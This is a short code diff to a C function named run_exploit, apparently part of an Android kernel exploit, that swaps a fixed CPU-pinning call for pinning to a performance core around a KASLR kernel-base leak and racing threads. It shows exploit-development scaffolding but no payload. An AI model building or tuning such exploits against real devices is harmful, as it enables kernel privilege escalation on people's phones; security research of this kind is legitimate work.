@@ -270,7 +270,7 @@ int run_exploit(int argc, char **argv) {
   rmg_log_reclaim_lifetime("child-run-start");
   init_ashmem_path();
 
-  pin_to_core(CORE);
+  pin_to_perf_core();
   if (!slide_leak_kernel_base()) {
     pr_error("slide kaslr leak failed\n");
     return 1;
@@ -281,7 +281,7 @@ int run_exploit(int argc, char **argv) {
     return 0;
   }
 
-  pin_to_core(CORE);
+  pin_to_perf_core();
 
   run_main_route_threads();
 
